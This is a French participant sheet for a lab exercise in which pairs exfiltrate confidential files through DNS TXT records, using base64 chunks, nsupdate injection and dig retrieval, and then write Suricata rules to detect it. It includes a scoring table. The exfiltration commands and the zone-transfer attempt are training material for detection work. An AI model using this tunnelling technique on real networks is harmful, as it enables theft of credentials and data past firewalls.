# Opération GHOST PIPE — Fiche Participant

## Votre mission

Corp Industries a été compromis. Un attaquant a pris le contrôle du poste `pc-finance` de la direction financière. Le firewall bloque toutes les connexions sortantes... sauf le DNS. Votre objectif : exfiltrer des fichiers confidentiels en les cachant dans des enregistrements DNS TXT, puis configurer un IDS pour détecter cette technique.

**Durée** : journée complète — **Équipes** : binômes


---

## Accès aux machines

```bash
docker exec -it ghost-workstation bash   # Poste compromis (réseau interne)
docker exec -it ghost-attacker bash      # Machine de récupération (réseau externe)
docker exec -it ghost-ids bash           # Console IDS Suricata
```


## Phase 0 — Reconnaissance (30 min)

1. Explorez les fichiers dans `/home/employe/documents/` sur la workstation
2. Testez la résolution DNS : `dig A pc-finance.corp.local @172.20.0.53`
3. Listez les TXT existants : `dig TXT corp.local @172.20.0.53`
4. Tentez un transfert de zone depuis l'attaquant : `dig AXFR corp.local @172.30.0.53`
5. Consultez les alertes Suricata : `docker exec ghost-ids tail /var/log/suricata/fast.log`


## Phase 1 — Injection DNS (1h30)

**Principe** : encoder un fichier en base64, le découper en morceaux, et stocker chaque morceau dans un enregistrement TXT du serveur DNS.

**Étape manuelle** — Commencez par le mémo confidentiel :

```bash
# 1. Encoder le fichier
base64 -w 0 /home/employe/documents/memo-confidentiel.txt

# 2. Calculer le hash de vérification
sha256sum /home/employe/documents/memo-confidentiel.txt

# 3. Injecter un TXT manuellement
nsupdate << EOF
server 172.20.0.53
zone corp.local
update add chunk-001.exfil.corp.local. 3600 TXT "votre_base64_ici"
send
EOF

# 4. Vérifier
dig TXT chunk-001.exfil.corp.local @172.20.0.53
```

**Étape script** — Automatisez le processus pour tous les fichiers. Votre script doit :
- Encoder le fichier en base64
- Calculer son hash SHA256
- Découper le base64 en chunks de 250 caractères
- Stocker les métadonnées dans `chunk-000` au format : `nom_fichier|nb_chunks|sha256|taille`
- Injecter tous les chunks via nsupdate (chunk-001, chunk-002, etc.)


## Phase 2 — Extraction DNS (1h30)

**Depuis la machine attaquant**, récupérez les données injectées.

**Étape manuelle** — Commencez par lire les métadonnées :

```bash
dig +short TXT chunk-000.exfil.corp.local @172.30.0.53
```

Puis reconstituez le fichier en récupérant chaque chunk, en les concaténant, et en décodant le base64.

**Étape script** — Automatisez l'extraction complète avec vérification SHA256.

**Cibles** : exfiltrez les 4 fichiers et relevez les FLAGS qu'ils contiennent.


## Phase 3 — Détection Suricata (1h30)

Le fichier `/var/lib/suricata/rules/ghost-pipe.rules` contient 8 règles, mais seulement 2 sont actives.

**Votre travail** :
1. **R3-R4** : Décommentez et comprenez ces règles de détection par pattern
2. **R5** : Activez la détection par volume (threshold) — quel seuil est pertinent ?
3. **R6** : Écrivez une règle pour détecter les mises à jour dynamiques DNS (indice : opcode UPDATE)
4. **R7** : Écrivez une règle pour détecter les réponses TXT anormalement volumineuses
5. **R8** (bonus) : Écrivez une règle regex pour détecter du base64 dans les réponses TXT

Après chaque modification :

```bash
kill -USR2 $(pgrep suricata)                    # Recharger les règles
tail -f /var/log/suricata/fast.log               # Observer les alertes
```

Puis relancez une exfiltration pour tester vos règles.


## Phase 4 — Évasion (bonus, 45 min)

Comment contourner les règles que vous venez d'écrire ? Pour chaque technique d'évasion, proposez la contre-mesure Suricata.


## Barème

| Épreuve | Points |
|---------|--------|
| Exfiltration memo-confidentiel.txt | 2 |
| Exfiltration credentials.csv | 3 |
| Exfiltration serveur-prod.key | 3 |
| Exfiltration dump-clients-prod.sql | 4 |
| Règles R3-R4 | 2 |
| Règle R5 (threshold) | 2 |
| Règle R6 (nsupdate) | 3 |
| Règle R7 (dsize) | 2 |
| Règle R8 bonus (pcre) | 3 |
| Technique d'évasion | 2 |
| **Total** | **26** |


## Aide-mémoire

```bash
# Encodage base64
base64 -w 0 fichier.txt              # Encoder (sans retour à la ligne)
echo "data" | base64 -d              # Décoder

# Hash SHA256
sha256sum fichier.txt

# DNS
dig TXT nom.corp.local @172.20.0.53  # Requête TXT
dig +short TXT nom.corp.local @IP    # Réponse courte
dig AXFR corp.local @IP              # Transfert de zone

# nsupdate (injection)
nsupdate << EOF
server 172.20.0.53
zone corp.local
update add nom.corp.local. 3600 TXT "data"
send
EOF

# Suricata
tail -f /var/log/suricata/fast.log
jq 'select(.alert)' /var/log/suricata/eve.json
kill -USR2 $(pgrep suricata)         # Recharger règles
```
